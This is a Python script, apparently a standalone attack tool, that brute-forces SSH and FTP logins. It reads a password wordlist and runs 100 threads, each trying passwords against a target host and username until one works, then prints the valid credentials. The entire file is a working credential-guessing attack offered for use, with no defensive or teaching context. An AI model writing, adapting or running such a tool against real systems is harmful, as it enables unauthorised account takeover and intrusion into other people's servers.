import ftplib, paramiko, socket
import threading, queue, sys, time

guessed = False
correct_password = ''
threads = []

def ssh_guesser(hostname, username):
    global guessed, correct_password
    sshclient = paramiko.SSHClient()
    sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    while not guessed and not q.empty():
        password = q.get()
        try:
            sshclient.connect(hostname=hostname, username=username, password=password, timeout=5)
            print(f"[+] Correct combination found:\nUsername: {username}\nPassword: {password}")
            guessed = True
            correct_password = password
        except socket.timeout:
            print("[-] Host is unreachable! Exiting...")
        except paramiko.AuthenticationException:
            pass
        except paramiko.SSHException:
            print("[-] Quota exceeded! Exiting...")
            time.sleep(1)
            
        sshclient.close()
        q.task_done()
        

def ftp_guesser(hostname, username):
    global guessed, correct_password
    ftpclient = ftplib.FTP()
    while not guessed and not q.empty():
        password = q.get()
        print(f"[+] Trying...{password}")
        try:
            ftpclient.connect(hostname, 21, timeout = 3)
            ftpclient.login(username, password)
            print(f"[+] Found valid combo\nUsername: {username}\nPassword: {password}")
            guessed = True
            correct_password = password
        except:
            pass
        
        q.task_done()
        

q = queue.Queue()

hostname = sys.argv[1]
username = sys.argv[2]
type = sys.argv[3]

if type == "ssh":
    with open('wordlists/password_list', 'r') as file:
        for password in file.read().splitlines():
            q.put(password)
            
    for i in range(100):
        t = threading.Thread(target=ssh_guesser, args=(hostname, username), daemon=True)
        t.start()
        threads.append(t)
        
if type == "ftp":
    with open('wordlists/password_list', 'r') as file:
        for password in file.read().splitlines():
            q.put(password)
            
    for i in range(100):
        t = threading.Thread(target=ftp_guesser, args=(hostname, username), daemon=True)
        t.start()
        threads.append(t)
        
for t in threads:
    t.join()
        
while True:
    if guessed == True:
        print(f"[+] Valid login details found:\nUsername: {username}\nPassword: {correct_password}")
        exit()
    elif guessed == False and q.empty():
        print("[-] No valid login details found!")
        exit()        